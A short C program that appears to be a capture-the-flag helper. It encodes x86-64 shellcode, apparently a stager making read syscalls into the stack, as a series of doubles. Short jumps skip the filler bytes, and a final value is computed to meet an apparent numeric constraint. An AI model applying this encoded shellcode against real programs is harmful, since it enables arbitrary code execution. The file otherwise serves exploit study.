#include <stdio.h>
#include <string.h>
int main() {
  const char *a = "H\xc1\xe4\x08\xeb\x02""0CjBZ\x90\xeb\x02""0CH\x89\xe6\x90\xeb\x02""0C\x0f\x05""1\xd2\xeb\x02""0C\x80\xf4\x01\x0f\x05X0C";
  const char *b = "f\xbc\x1f`\xeb\x82""0C";
  double d = 0.0;
  int l = strlen(a)/8;
  for(int i = 0; i < l; ++i) {
    printf("%.32lf\n", *((double *)a+i));
    d += *((double *)a+i);
  }
  puts("----");
  double r;
  printf("%.32lf\n", r = *(double *)b * 6.0 - d);

  /* testing correctness */
  r += d;
  r /= 6.0;
  printf("%x %x\n", *(unsigned char *)&r, *((unsigned char *)&r+1));
  return 0;
}
